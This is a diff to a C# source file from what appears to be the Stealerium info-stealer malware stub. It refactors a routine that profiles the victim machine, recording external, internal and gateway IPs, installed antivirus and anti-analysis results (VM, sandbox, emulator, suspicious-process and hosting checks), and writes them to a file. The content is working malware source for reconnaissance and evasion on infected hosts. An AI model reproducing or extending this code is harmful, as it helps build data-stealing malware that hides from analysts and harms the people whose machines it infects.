@@ -7,13 +7,23 @@ namespace Stealerium.Stub.Target.System
 {
     internal sealed class SysInfo
     {
+        /// <summary>
+        /// Saves system information to the specified path.
+        /// </summary>
+        /// <param name="sSavePath">The file path where system info will be saved.</param>
         public static void Save(string sSavePath)
         {
             try
             {
+                // Fetch hosting status synchronously
+                bool hostingStatus = AntiAnalysis.Run();
+
+                // Fetch external IP synchronously
+                string externalIp = SystemInfo.GetPublicIpAsync().GetAwaiter().GetResult();
+
                 var systemInfoText = ""
                                      + "\n[IP]"
-                                     + "\nExternal IP: " + SystemInfo.GetPublicIpAsync()
+                                     + "\nExternal IP: " + externalIp
                                      + "\nInternal IP: " + SystemInfo.GetLocalIp()
                                      + "\nGateway IP: " + SystemInfo.GetDefaultGateway()
                                      + "\n"
@@ -33,16 +43,15 @@ namespace Stealerium.Stub.Target.System
                                      + "\nVirtualMachine: " + AntiAnalysis.VirtualBox()
                                      + "\nSandBoxie: " + AntiAnalysis.SandBox()
                                      + "\nEmulator: " + AntiAnalysis.Emulator()
-                                     + "\nDebugger: " + AntiAnalysis.Debugger()
-                                     + "\nProcesses: " + AntiAnalysis.Processes()
-                                     + "\nHosting: " + AntiAnalysis.HostingAsync()
+                                     + "\nProcesses: " + AntiAnalysis.SuspiciousProcess()
+                                     + "\nHosting: " + hostingStatus
                                      + "\nAntivirus: " + SystemInfo.GetAntivirus()
                                      + "\n";
 
                 // Output the system info to the console
                 Console.WriteLine(systemInfoText);
 
-                // Save the system info to a file
+                // Save the system info to a file synchronously
                 File.WriteAllText(sSavePath, systemInfoText);
             }
             catch (Exception ex)
